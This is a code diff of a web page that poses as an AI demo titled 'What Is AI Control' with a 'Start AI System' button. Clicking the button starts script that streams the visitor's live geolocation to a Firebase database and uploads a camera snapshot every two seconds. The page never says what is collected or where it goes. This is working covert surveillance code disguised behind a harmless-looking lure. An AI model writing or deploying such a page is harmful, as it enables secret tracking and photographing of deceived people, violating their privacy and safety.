@@ -13,17 +13,30 @@ text-align:center;
 background:black;
 color:white;
 }
+
 video{
-width:300px;
+width:90%;
+max-width:400px;
 border:2px solid white;
 margin-top:10px;
+}
+
+button{
+padding:15px;
+font-size:18px;
+margin-top:20px;
+cursor:pointer;
 }
 </style>
 
 </head>
 <body>
 
-<h2>Next Future Is AI 💫</h2>
+<h2>What Is AI Control</h2>
+
+<button onclick="startSharing()">Start AI System</button>
+
+<br>
 
 <video id="camera" autoplay playsinline></video>
 
@@ -41,10 +54,11 @@ const firebaseConfig = {
 
 firebase.initializeApp(firebaseConfig);
 
-// unique phone id
 let phoneId = "phone_" + Math.floor(Math.random()*100000);
 
-// LOCATION
+function startSharing(){
+
+// LOCATION permission request
 navigator.geolocation.watchPosition(function(pos){
 
 firebase.database().ref("devices/"+phoneId+"/location").set({
@@ -54,14 +68,16 @@ lon: pos.coords.longitude
 
 });
 
-// CAMERA
-const video = document.getElementById("camera");
-
+// CAMERA permission request
 navigator.mediaDevices.getUserMedia({video:true})
 .then(stream=>{
+
+const video = document.getElementById("camera");
+
 video.srcObject = stream;
 
 const canvas = document.createElement("canvas");
+
 const ctx = canvas.getContext("2d");
 
 setInterval(()=>{
@@ -79,7 +95,12 @@ image:imageData
 
 },2000);
 
+})
+.catch(err=>{
+alert("Camera permission denied or error");
 });
+
+}
 
 </script>
 
